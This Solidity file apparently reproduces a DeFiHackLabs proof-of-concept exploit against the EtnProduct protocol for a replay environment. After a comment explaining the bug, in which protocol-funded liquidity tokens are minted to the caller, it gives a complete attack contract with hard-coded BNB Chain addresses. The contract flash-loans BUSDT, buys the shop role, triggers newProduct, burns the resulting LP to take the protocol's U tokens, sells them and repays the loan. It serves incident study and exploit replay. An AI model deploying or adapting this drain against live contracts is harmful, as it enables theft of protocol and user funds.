// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-08-EtnProduct).
//
// The DeFiHackLabs PoC (test/EtnProduct_exp.sol) runs the attack INLINE in the
// Foundry `Exploit` test harness — the DVM flash-loan callback `DVMFlashLoanCall`
// lives on the test itself (`assetTo = address(this)`), `attacker = address(this)`,
// and profit is measured as `BUSDT.balanceOf(address(this))`. There is no
// standalone contract to deploy. This file is a faithful, self-contained copy of
// that inline attack (the testExploit body + DVMFlashLoanCall callback + minimal
// inline interfaces — no imports so it compiles anywhere), compiled inside the
// registry forge project. Logic and constants are copied verbatim from
// test/EtnProduct_exp.sol.
//
// Root cause: EtnProduct.newProduct() bootstraps a PancakeSwap pool for each new
// product token using 700,000 of the PROTOCOL's own `U` balance (plus 700,000 of
// the freshly-minted product token), but the liquidity-provider LP tokens from
// router.addLiquidity() are minted to `msg.sender` (the caller) instead of the
// protocol owner — the line above it (`// owner,`) is the commented-out intended
// recipient. The only guard is `canUploadProduct`, a shop-NFT role that any
// address can self-grant for ~1,998 BUSDT by minting a community NFT and a shop
// NFT. So for a small fee the attacker triggers a 700k-`U` "donation" into a pool
// they exclusively own, then burns the LP to reclaim the protocol's `U`, selling
// it through UMarket for ~3,074 BUSDT of net profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IPancakePair {
    function transfer(address, uint256) external returns (bool);
    function burn(address) external returns (uint256, uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IEtnShop {
    function invite(address to, uint256 commId) external;
    function mint(uint256 commId, string memory name, string memory logo) external returns (uint256);
}

interface IEtnNFT {
    function mintETN(string memory uri, string memory name, string memory cid) external payable;
}

interface IEtnProduct {
    function newProduct(
        uint256 commId,
        uint256 shopId,
        uint256 price,
        string memory name,
        string memory video
    ) external;
}

interface IUMarket {
    function saleU(uint256 amount) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract EtnProductDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair constant Pair = IPancakePair(0xc9053B00720EB661BBdDC7BD6abA1d222aAd5a71);
    IERC20 constant U = IERC20(0xaa33085e8Fa2CB903157324603E4601299E5dA06);
    IEtnShop constant Shop = IEtnShop(0xBceF2955C8955342E9CC92A090bDaEcFF8c562F8);
    IEtnNFT constant NFT = IEtnNFT(0x48835A9065AF7315916ADfc1f952b7aBebdBFd62);
    IEtnProduct constant EtnProduct_ = IEtnProduct(0x1292267f726e6F313972ec4e14578735473e1649);
    IUMarket constant Market = IUMarket(0xc0e8D30D2ead2C324b3f1A8386992Ba1Be534CbF);
    address constant DODO = 0x52D1C9E81D2bacDAe4c0E6815E63Db8EFBA5fD37;
    IUniswapV2Router02 constant Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function run() external payable {
        // Flash-loan 9,400 BUSDT from the DODO DVM pool. The callback below
        // executes the attack and repays the loan within this same tx. msg.value
        // funds the native-BNB ETN-NFT mint (the Foundry test relied on the test
        // contract's inherent balance; here it is passed in via attackValueWei).
        IDVM(DODO).flashLoan(0, 9400 * 1e18, address(this), "0x123");
    }

    function DVMFlashLoanCall(address, uint256, uint256 c, bytes memory) public {
        approveAll();
        // Buy WBNB with 7,380 BUSDT (used only to satisfy approvals; the NFT mint
        // consumes native BNB supplied as msg.value to run()).
        swapTokenToToken(address(BUSDT), address(WBNB), 7380 ether);

        // Self-grant the shop-NFT role: mint community NFT id 11, self-invite,
        // then mint shop NFT 1100 (costs 1,998 BUSDT).
        NFT.mintETN{value: 24.15458972 ether}("fw", "sb", "jb");
        Shop.invite(address(this), 11);
        Shop.mint(11, "fw", "sb");

        // Trigger protocol-funded liquidity: newProduct creates a product token
        // and seeds a pair with 700k of EtnProduct's U + 700k product token.
        // The LP is minted to msg.sender (this contract) — the core bug.
        EtnProduct_.newProduct(11, 0, 10_000_000_000, "jb", "sb");

        // Redeem 600,000 LP: returns ~606,091 U (the protocol's seed) + product.
        Pair.transfer(address(Pair), 600_000 ether);
        Pair.burn(address(this));

        // Sell recovered U for BUSDT 1:1 through the UMarket OTC desk.
        U.approve(address(Market), 9_999_999 ether);
        Market.saleU(11_253_734_856_316_884_358_000);

        // Repay the flash loan.
        BUSDT.transfer(msg.sender, c);
    }

    function swapTokenToToken(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function approveAll() internal {
        WBNB.approve(address(Shop), type(uint256).max);
        WBNB.approve(address(NFT), type(uint256).max);
        BUSDT.approve(address(Shop), type(uint256).max);
        BUSDT.approve(address(NFT), type(uint256).max);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
